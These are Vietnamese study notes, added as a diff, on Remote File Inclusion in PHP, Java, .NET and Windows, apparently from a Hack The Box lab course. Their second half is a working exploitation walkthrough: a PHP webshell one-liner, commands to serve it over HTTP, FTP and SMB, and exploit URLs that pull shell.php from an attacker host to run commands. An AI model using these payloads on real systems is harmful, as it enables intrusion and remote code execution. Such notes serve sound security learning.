@@ -1,0 +1,86 @@
+Khái niệm & Ý nghĩa
+  RFI = Include file từ xa.
+  Hậu quả: SSRF (liệt kê dịch vụ nội bộ) + RCE (thực thi code từ file độc hại).
+  Luôn nhớ: RFI ⊇ LFI, nhưng LFI ⊄ RFI.
+
+Điều kiện RFI xảy ra
+  Hàm cho phép load URL (PHP include(), file_get_contents(), Java import, .NET RemotePartial, …).
+  Có thể điều khiển cả protocol (http://, ftp://, …).
+  Cấu hình cho phép (ví dụ PHP allow_url_include=On).
+
+RFI và cấu hình allow_url_include=On
+  Trong PHP:
+    Muốn dùng include("http://...") hoặc require("http://...") thì cần allow_url_include=On.
+    Nếu Off thì chỉ được include file local, không được từ URL → tức là chỉ LFI, không RFI.
+    allow_url_fopen=On cho phép dùng URL trong các hàm đọc file (file_get_contents, fopen…), nhưng không cho thực thi code → chỉ đọc nội dung.
+  Trong các ngôn ngữ/ môi trường khác:
+    Java (import), .NET (RemotePartial) hay Windows SMB include: không phụ thuộc vào allow_url_include.
+    Ví dụ trên Windows: \\attacker\share\shell.php vẫn được load và thực thi mà không cần bật gì thêm.
+
+Các hàm liên quan đến File Inclusion
+| Ngôn ngữ    | Function / Method                       | Đọc nội dung | Thực thi code | Remote URL hỗ trợ | Ghi chú                                           |
+| ----------- | --------------------------------------- | ------------ | ------------- | ----------------- | ------------------------------------------------- |
+| **PHP**     | `include()` / `include_once()`          | ✅            | ✅             | ✅                 | Cần `allow_url_include=On` để RFI                 |
+|             | `require()` / `require_once()`          | ✅            | ✅             | ✅                 | Tương tự `include`                                |
+|             | `file_get_contents()`                   | ✅            | ❌             | ✅                 | Cần `allow_url_fopen=On`; chỉ đọc, không chạy     |
+|             | `fopen()` / `fpassthru()`               | ✅            | ❌             | ✅                 | Chỉ đọc stream                                    |
+|             | `readfile()`                            | ✅            | ❌             | ✅                 | In nội dung file ra output                        |
+|             | `file()`                                | ✅            | ❌             | ✅                 | Đọc file thành mảng dòng                          |
+|             | `virtual()` (Apache only)               | ✅            | ✅             | ❌                 | Chỉ include file local (server API)               |
+|             | `highlight_file()` / `show_source()`    | ✅            | ❌             | ✅                 | Hiển thị mã nguồn, không thực thi                 |
+|             | `eval(file_get_contents("http://..."))` | ✅            | ✅             | ✅                 | Trường hợp gián tiếp, nguy hiểm hơn               |
+| **Java**    | `import` (JSP, Servlet)                 | ✅            | ✅             | ✅                 | Có thể load remote class/script                   |
+|             | `RequestDispatcher.include()`           | ✅            | ✅             | ❌                 | Chỉ local path                                    |
+| **.NET**    | `@Html.RemotePartial()` (Razor)         | ✅            | ❌             | ✅                 | Render partial view từ URL                        |
+|             | `Server.Execute()`                      | ✅            | ✅             | ❌                 | Chỉ local ASPX                                    |
+|             | `Server.Transfer()`                     | ✅            | ✅             | ❌                 | Chỉ local ASPX                                    |
+| **Windows** | UNC Path (`\\IP\share\file.php`)        | ✅            | ✅             | ✅                 | Không cần `allow_url_include`; phổ biến trong SMB |
+
+
+
+
+Kiểm tra RFI
+  Test với URL nội bộ: ?page=http://127.0.0.1/index.php
+    Nếu load & thực thi → RFI thành công.
+
+Khai thác RFI → RCE
+  Webshell đơn giản:
+    <?php system($_GET['cmd']); ?>
+  Host file độc hại:
+    HTTP: python3 -m http.server 80
+    FTP: python -m pyftpdlib -p 21
+    SMB (Windows): impacket-smbserver -smb2support share $(pwd)
+  Payload:
+    http://target/index.php?page=http://<attacker_ip>/shell.php&cmd=id
+
+Exploit 
+
+HTTP
+  Chuẩn bị payload 
+    naruto3co@htb[/htb]$ echo '<?php system($_GET["cmd"]); ?>' > shell.php
+  Tạo web để RFI 
+    sudo python3 -m http.server <LISTENING_PORT>
+  Link exploit 
+    http://<SERVER_IP>:<PORT>/index.php?language=http://<OUR_IP>:<LISTENING_PORT>/shell.php&cmd=id
+
+FTP
+  Dùng python pyftpdlib
+    naruto3co@htb[/htb]$ sudo python -m pyftpdlib -p 21
+  Link exploit 
+    http://<SERVER_IP>:<PORT>/index.php?language=ftp://<OUR_IP>/shell.php&cmd=id
+  Có thể dùng thủ công bằng cách này 
+     curl 'http://<SERVER_IP>:<PORT>/index.php?language=ftp://user:pass@localhost/shell.php&cmd=id'
+
+SMB
+  Nếu target là Windows (chúng ta có thể biết được thông qua phiên bản máy chủ trong tiêu đề phản hồi HTTP), thì chúng ta không cần bật cài đặt allow_url_include để khai thác RFI, vì chúng ta có thể sử dụng giao thức SMB để đưa tệp từ xa vào. Điều này là do Windows coi các tệp trên máy chủ SMB từ xa là các tệp bình thường, có thể được tham chiếu trực tiếp bằng đường dẫn UNC.
+  
+  Chúng ta có thể khởi tạo máy chủ SMB bằng cách sử dụng smbserver.py của Impacket, cho phép xác thực ẩn danh theo mặc định, như sau:
+  naruto3co@htb[/htb]$ impacket-smbserver -smb2support share $(pwd)
+  Now, we can include our script by using a UNC path (e.g. \\<OUR_IP>\share\shell.php), and specify the command with (&cmd=whoami) as we did earlier:
+  Như chúng ta có thể thấy, cuộc tấn công này hoạt động bằng cách bao gồm tập lệnh từ xa của chúng tôi, và chúng tôi không cần bất kỳ thiết lập nào không phải mặc định để bật. Tuy nhiên, cần lưu ý rằng kỹ thuật này có nhiều khả năng hoạt động hơn nếu chúng tôi sử dụng cùng một mạng, vì việc truy cập máy chủ SMB từ xa qua internet có thể bị tắt theo mặc định, tùy thuộc vào cấu hình máy chủ Windows.
+
+
+
+
+
+
